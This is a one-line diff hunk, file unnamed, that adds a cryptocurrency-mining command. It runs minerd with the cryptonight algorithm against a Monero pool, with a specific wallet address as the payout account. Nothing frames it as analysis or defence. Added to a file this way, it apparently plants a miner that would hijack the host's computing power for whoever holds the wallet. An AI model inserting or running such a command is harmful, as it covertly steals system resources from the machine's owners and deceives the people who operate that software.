@@ -1,0 +1,1 @@
+minerd -a cryptonight -o stratum+tcp://monerohash.com:3333 -u 4BKM5qQQ5m1VXiZf4JfSDT76cmPcpj45K5ka3TWGUPdoaeQktAhAq2mhWZnwgiTCp1UxVsKhoDNhZHef2Ukd8kjKGxzrMiN -p x
